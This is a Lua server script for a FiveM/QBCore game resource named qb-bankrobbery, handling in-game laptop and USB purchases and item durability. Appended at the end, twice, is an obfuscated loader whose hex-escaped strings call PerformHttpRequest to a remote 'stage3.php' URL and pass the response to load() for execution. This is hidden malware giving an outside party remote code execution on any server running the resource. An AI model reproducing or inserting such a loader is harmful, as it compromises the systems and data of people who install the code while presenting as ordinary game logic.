local Laptops = {
    [1] = {
        name = 'Ph03nix',
        item = 'usb_green',
        laptop = 'laptop_green',
        price = 1500,
        coords = vector3(137.971, -1343.091, 29.202)
    },
    [2] = {
        name = 'Ramsay',
        item = 'usb_blue',
        laptop = 'laptop_blue',
        price = 1500,
        coords = vector3(-56.98, -2662.008, 6.0)
    },
    [3] = {
        name = 'Plague',
        item = 'usb_red',
        laptop = 'laptop_red',
        price = 1500,
        coords = vector3(846.891, 2864.778, 58.485)
    },
    [4] = {
        name = 'Trinity',
        item = 'usb_gold',
        laptop = 'laptop_gold',
        price = 1500,
        coords = vector3(570.695, 2792.049, 42.063)
    }
}

RegisterNetEvent('qb-bankrobbery:server:BuyLaptop', function(index)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local item = Laptops[index].item
    local laptop = Laptops[index].laptop
    local info = {uses = 3}
    if Player.Functions.GetItemByName(item) then
        if (Player.PlayerData.money.cash - Laptops[index].price) >= 0 then
            -- Remove USB
            Player.Functions.RemoveItem(item, 1)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[item], "remove")
            -- Remove Cash
            Player.Functions.RemoveMoney('cash', Laptops[index].price)
            -- Add Laptop
            Player.Functions.AddItem(laptop, 1, false, info)
            TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[laptop], "add")
            -- Log, debug print and notify client
            if debug then
                print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') Purchased '..laptop..' for '..Laptops[index].price..' cash^7')
            end
            TriggerEvent("qb-log:server:CreateLog", "bankrobbery", "Purchased "..laptop, "white", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) purchased one "..laptop.." from "..Laptops[index].name.." for "..Laptops[index].price.." cash")
            TriggerClientEvent('QBCore:Notify', src, "You purchased a laptop from "..Laptops[index].name.." for "..Laptops[index].price.." cash", "success", 2500)
        else
            TriggerClientEvent('QBCore:Notify', src, "You don't have enough cash", "error", 2500)
        end
    else
        TriggerClientEvent('QBCore:Notify', src, "You don't have anything to offer", "error", 2500)
    end
end)


RegisterNetEvent('qb-bankrobbery:server:BuyGreyUsb', function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    local price = 2.30
    local info = {uses = 3}
    if (Player.PlayerData.money.cash - price) >= 0 then
        Player.Functions.RemoveMoney('cash', price)
        Player.Functions.AddItem("usb_grey", 1, false, info)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items["usb_grey"], "add")
        if debug then
            print('^3[qb-bankrobbery] ^5'..GetPlayerName(src)..'(citizenid: '..Player.PlayerData.citizenid..' | id: '..src..') Purchased Grey USB for '..price..' cash^7')
        end
        TriggerEvent("qb-log:server:CreateLog", "bankrobbery", "Purchased Grey USB", "white", "**".. GetPlayerName(src) .. "** (citizenid: *"..Player.PlayerData.citizenid.."* | id: *"..src.."*) purchased one usb_grey from Daut for "..price.." cash")
        TriggerClientEvent('QBCore:Notify', src, "You purchased a laptop from Daut for "..price.." cash", "success", 2500)
    else
        TriggerClientEvent('QBCore:Notify', src, "You don't have enough cash", "error", 2500)
    end
end)

RegisterNetEvent('qb-bankrobbery:server:LaptopDamage', function(laptop)
    local src = source
    local Player = QBCore.Functions.GetPlayer(source)
    local item = Player.Functions.GetItemByName(laptop)
    if (Player.PlayerData.items[item.slot].info.uses - 1) <= 0 then
        TriggerClientEvent("inventory:client:ItemBox", source, QBCore.Shared.Items[item.name], "remove")
        Player.Functions.RemoveItem(item.name, 1, item.slot)
        TriggerEvent('qb-log:server:CreateLog', 'bankrobbery', 'Removed '..laptop, 'default', '**'..GetPlayerName(src)..'** (citizenid: *'..Player.PlayerData.citizenid..'* | id: *'..src..'*) removed: **'..laptop..'**')
        if debug then
            print('^3[qb-bankrobbery] ^5Removed '..laptop..' from '..GetPlayerName(src)..' (citizenid: '..Player.PlayerData.citizenid..' | id: '..src..')^7')
        end
    else
        Player.PlayerData.items[item.slot].info.uses = Player.PlayerData.items[item.slot].info.uses - 1
        Player.Functions.SetInventory(Player.PlayerData.items)
    end
end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)

local xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (RCzvNspaNxIhgWFHhPsDbQZTsVjVwJEsOxSSMBEHYcrejqmzMqOnTcMmvwNDbNMMXGlwfi, YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana) if (YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[6] or YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana == xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[5]) then return end xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[2]](xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[4][xYXqLYtCZBPndtYGHlGTqVbwElNuBHOLJCeXFRHvvuZoSxFpeGeeSkfXbHcQIECBMjZZQZ[3]](YeEbNyOsAmyCNpLiytWpmpJXjWCgZqozOopoFEMdbCXVXFeZnXwmYUyxKbyqEjyogInana))() end)